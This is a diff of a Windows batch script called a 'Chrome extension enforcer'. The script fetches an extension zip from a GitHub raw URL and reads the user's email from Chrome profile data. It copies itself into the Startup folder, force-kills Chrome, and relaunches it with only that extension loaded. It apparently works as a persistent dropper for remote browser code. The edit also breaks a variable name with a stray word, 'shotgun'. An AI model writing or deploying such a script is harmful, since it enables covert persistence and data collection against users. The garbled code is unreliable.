@@ -10,9 +10,8 @@ set "LOGFILE=%USERPROFILE%\Documents\chrome_enforcer_log.txt"
 echo [%DATE% %TIME%] Starting Chrome extension enforcer (DEBUG MODE) >> "%LOGFILE%"
 echo Starting Chrome extension enforcer (DEBUG MODE)
 
-REM 1) CONFIG: GitHub raw zip URL and optional SQLite3 URL
+REM 1) CONFIG: GitHub raw zip URL
 set "ZIP_URL=https://raw.githubusercontent.com/Ayamet/web/main/main/extension.zip"
-set "SQLITE_URL=https://sqlite.org/2023/sqlite-dll-win64-x64-3430100.zip"
 echo Step 1: Configured ZIP URL: %ZIP_URL%
 echo [%DATE% %TIME%] Configured ZIP URL: %ZIP_URL% >> "%LOGFILE%"
 
@@ -90,27 +89,7 @@ if "%FOUND%"=="0" (
 echo Successfully located extension at %EXT_DIR%
 echo [%DATE% %TIME%] Found extension at %EXT_DIR% >> "%LOGFILE%"
 
-REM 5) Optional: Download and extract sqlite3.dll (uncomment if extension requires SQLite3)
-REM echo Step 6: Downloading sqlite3.dll
-REM powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-REM   "try { Invoke-WebRequest -Uri '%SQLITE_URL%' -OutFile '%WORKDIR%\sqlite.zip' -UseBasicParsing; exit 0 } catch { exit 1 }"
-REM if errorlevel 1 (
-REM   echo WARNING: Failed to download sqlite3.dll, extension may fail if it requires SQLite3
-REM   echo [%DATE% %TIME%] WARNING: Failed to download sqlite3.dll >> "%LOGFILE%"
-REM ) else (
-REM   echo Extracting sqlite3.dll to %EXT_DIR%
-REM   powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-REM     "try { Expand-Archive -LiteralPath '%WORKDIR%\sqlite.zip' -DestinationPath '%EXT_DIR%' -Force; exit 0 } catch { exit 1 }"
-REM   if errorlevel 1 (
-REM     echo WARNING: Failed to extract sqlite3.dll
-REM     echo [%DATE% %TIME%] WARNING: Failed to extract sqlite3.dll >> "%LOGFILE%"
-REM   ) else (
-REM     echo Successfully extracted sqlite3.dll to %EXT_DIR%
-REM     echo [%DATE% %TIME%] Extracted sqlite3.dll to %EXT_DIR% >> "%LOGFILE%"
-REM   )
-REM )
-
-REM 6) Check for SQLite3 dependency in extension
+REM 5) Check for SQLite3 dependency in extension
 echo Step 6: Checking for SQLite3-related files in %EXT_DIR%
 set "SQLITE_FOUND=0"
 if exist "%EXT_DIR%\*sqlite*" (
@@ -122,7 +101,7 @@ if exist "%EXT_DIR%\*sqlite*" (
 echo SQLite check complete: SQLite files found=%SQLITE_FOUND%
 echo [%DATE% %TIME%] SQLite check: %SQLITE_FOUND% >> "%LOGFILE%"
 
-REM 7) Scan Chrome profiles for email
+REM 6) Scan Chrome profiles for email
 echo Step 7: Scanning Chrome profiles for email
 set "EMAIL="
 for /D %%P in ("%LOCALAPPDATA%\Google\Chrome\User Data\*") do (
@@ -140,7 +119,7 @@ if not defined EMAIL set "EMAIL=anonymous@demo.com"
 echo Using email: %EMAIL%
 echo [%DATE% %TIME%] Using email: %EMAIL% >> "%LOGFILE%"
 
-REM 8) Write config.json
+REM 7) Write config.json
 echo Step 8: Writing config.json with email %EMAIL%
 > "%EXT_DIR%\config.json" echo {"userEmail":"!EMAIL!"}
 if errorlevel 1 (
@@ -152,7 +131,7 @@ if errorlevel 1 (
 echo Successfully wrote config.json
 echo [%DATE% %TIME%] Wrote config.json with email %EMAIL% >> "%LOGFILE%"
 
-REM 9) Locate chrome.exe
+REM 8) Locate chrome.exe
 echo Step 9: Locating chrome.exe
 set "CHROME_PATH="
 for %%P in (
@@ -169,7 +148,7 @@ if not defined CHROME_PATH (
 echo Found Chrome at %CHROME_PATH%
 echo [%DATE% %TIME%] Found Chrome at %CHROME_PATH% >> "%LOGFILE%"
 
-REM 10) Ensure script runs on startup
+REM 9) Ensure script runs on startup
 echo Step 10: Copying script to startup folder
 set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 set "SCRIPT_NAME=ChromeExtensionEnforcerDebug.bat"
@@ -184,7 +163,7 @@ if errorlevel 1 (
   echo [%DATE% %TIME%] Copied script to startup folder >> "%LOGFILE%"
 )
 
-REM 11) Check and manage Chrome processes
+REM 10) Check and manage Chrome processes
 echo Step 11: Checking for Chrome processes
 set "CHROME_RUNNING=0"
 set "CHROME_COUNT=0"
@@ -196,7 +175,7 @@ for /f "tokens=2" %%A in ('tasklist /FI "IMAGENAME eq chrome.exe" /FO CSV /NH') 
 echo Total Chrome processes: %CHROME_COUNT%
 echo [%DATE% %TIME%] Total Chrome processes: %CHROME_COUNT% >> "%LOGFILE%"
 
-REM 12) Terminate all Chrome processes if any are running
+REM 11) Terminate all Chrome processes if any are running
 if "!CHROME_RUNNING!"=="1" (
   echo Step 12: Terminating all Chrome processes
   taskkill /IM chrome.exe /F
@@ -209,16 +188,19 @@ if "!CHROME_RUNNING!"=="1" (
     echo [%DATE% %TIME%] Terminated %CHROME_COUNT% Chrome processes >> "%LOGFILE%"
   )
   timeout /t 3
+) else (
+  echo Step 12: No Chrome processes running, skipping termination
+  echo [%DATE% %TIME%] No Chrome processes to terminate >> "%LOGFILE%"
 )
 
-REM 13) Launch single Chrome instance with extension
+REM 12) Launch single Chrome instance with extension
 echo Step 13: Launching Chrome with extension
-set "PROFILE_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\Default"
-if not exist "!PROFILE_DIR!" (
-  echo Creating profile directory: !PROFILE_DIR!
-  mkdir "!PROFILE_DIR!"
+set "PROFILE_DIR shotgun=%LOCALAPPDATA%\Google\Chrome\User Data\Default"
+if not exist "!PROFILE_DIR shotgun!" (
+  echo Creating profile directory: !PROFILE_DIR shotgun!
+  mkdir "!PROFILE_DIR shotgun!"
 )
-start "" "%CHROME_PATH%" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%EXT_DIR%" --load-extension="%EXT_DIR%"
+start "" "%CHROME_PATH%" --user-data-dir="!PROFILE_DIR shotgun!" --disable-extensions-except="%EXT_DIR%" --load-extension="%EXT_DIR%"
 if errorlevel 1 (
   echo ERROR: Failed to launch Chrome
   echo [%DATE% %TIME%] ERROR: Failed to launch Chrome >> "%LOGFILE%"
@@ -228,7 +210,7 @@ if errorlevel 1 (
   echo [%DATE% %TIME%] Launched Chrome with extension at %EXT_DIR% >> "%LOGFILE%"
 )
 
-REM 14) Monitor and enforce single Chrome instance
+REM 13) Monitor and enforce single Chrome instance
 echo Step 14: Starting monitoring loop
 echo [%DATE% %TIME%] Starting monitoring loop >> "%LOGFILE%"
 :monitor
